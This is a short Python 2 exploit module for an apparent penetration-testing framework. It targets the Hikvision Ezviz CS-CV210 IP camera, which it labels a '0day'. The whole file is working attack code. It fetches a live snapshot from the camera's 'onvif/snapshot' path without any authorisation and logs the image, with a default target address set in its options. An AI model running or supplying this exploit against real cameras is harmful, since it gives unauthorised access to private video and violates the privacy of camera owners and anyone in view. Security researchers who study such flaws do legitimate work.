#!/usr/bin/env python

import urllib2
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_ezviz_cs_cv210_ipcamera_snapshot"
INFO['DESCRIPTION'] = "Hikvision Ezviz CS-CV210(C3s) Snapshot"
INFO['VENDOR'] = "http://www.ezvizlife.com/"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Remote attaker can make snapshot. Authorization is not required.
Tested against Ezviz CS-CV210 firmware v5.2.7.
    """
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG']="12 Apr, 2017"
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.45"
OPTIONS["PORT"] = 80


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def make_url(self, path=''):
        return 'http://%s:%s/%s' % (self.host, self.port, path)

    def make_request(self, path=''):
        url = self.make_url(path)
        res = urllib2.urlopen(url)
        return res.read()

    def run(self):
        #Get options from gui
        self.args()
        self.log('[*] Trying to get snapshot')
        res = self.make_request('onvif/snapshot')
        self.logImage(res)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
